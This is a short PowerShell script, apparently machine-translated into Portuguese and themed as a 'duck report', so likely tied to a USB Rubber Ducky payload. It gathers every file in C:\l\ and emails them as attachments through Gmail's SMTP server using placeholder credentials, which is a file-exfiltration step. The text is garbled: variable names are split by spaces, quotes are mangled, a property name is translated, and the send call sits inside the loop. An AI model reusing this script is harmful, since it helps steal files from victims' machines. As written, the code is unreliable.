  
$ SMTPServer  =  ' smtp.gmail.com '
$ SMTPInfo  =  New-Object Net.Mail.SmtpClient ( $ SmtpServer ,  587 )
$ SMTPInfo .EnableSsl  =  $ true
$ SMTPInfo .Credentials  =  New-Object System.Net.NetworkCredential ( ' YOUREMAIL ' ,  ' YOURPASSWORD ' );
$ ReportEmail  =  New-Object System.Net.Mail.MailMessage
$ ReportEmail .De  =  ' youremail '
$ ReportEmail .To.Add ( ' YOUREMAIL ' )
$ ReportEmail .Subject  =  ' Relatório de pato '
$ ReportEmail .Body  =  'Em anexo está o seu relatório de pato .... Quack ' 
$ files = Get-ChildItem  " C: \ l \ "
Foreach ( $ file  in  $ files )
{
Write-Host  “ Anexando arquivo: - ”  $ file
$ attachment  =  New-Object System.Net.Mail.Attachment –ArgumentList C: \ l \ $ file
$ ReportEmail .Attachments.Add ( $ attachment )
$ SMTPInfo .Send ( $ ReportEmail )
}
write-host  " Correio enviado com sucesso "
